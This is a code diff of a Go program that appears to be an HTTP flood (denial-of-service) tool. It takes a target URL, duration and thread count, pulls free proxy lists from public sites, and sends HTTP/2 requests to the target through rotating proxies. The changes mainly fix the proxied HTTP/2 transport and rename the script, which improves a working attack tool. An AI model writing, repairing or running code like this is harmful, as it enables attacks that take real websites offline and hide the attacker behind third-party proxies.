@@ -1,5 +1,5 @@
 package main
-// w
+
 import (
     "crypto/tls"
     "flag"
@@ -52,21 +52,6 @@ var (
         "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout=20000",
         "https://proxyelite.info/wp-admin/admin-ajax.php?action=proxylister_download&nonce=afb07d3ca5&format=txt",
     }
-
-    clientPool = sync.Pool{
-        New: func() interface{} {
-            transport := &http2.Transport{
-                TLSClientConfig: createTLSConfig(),
-                DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
-                    return tls.Dial(network, addr, cfg)
-                },
-            }
-            return &http.Client{
-                Transport: transport,
-                Timeout:   500 * time.Millisecond,
-            }
-        },
-    }
 )
 
 func init() {
@@ -76,7 +61,7 @@ func init() {
     flag.Parse()
 
     if targetURL == "" || duration == 0 {
-        fmt.Println("Usage: go run by.go -url [target] -time [seconds] -threads [count]")
+        fmt.Println("Usage: go run server.go -url [target] -time [seconds] -threads [count]")
         os.Exit(1)
     }
     fetchProxies()
@@ -146,13 +131,20 @@ func sendRequest(proxyAddr, target string) {
         return
     }
 
-    transport := &http2.Transport{
+    // Use http.Transport instead of http2.Transport
+    transport := &http.Transport{
         TLSClientConfig: createTLSConfig(),
         DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
             return tls.Dial(network, addr, cfg)
         },
+        Proxy: http.ProxyURL(proxyURL),
     }
-    transport.Proxy = http.ProxyURL(proxyURL)
+
+    // Configure the transport for HTTP/2
+    if err := http2.ConfigureTransport(transport); err != nil {
+        atomic.AddUint64(&errorCount, 1)
+        return
+    }
 
     client := &http.Client{
         Transport: transport,
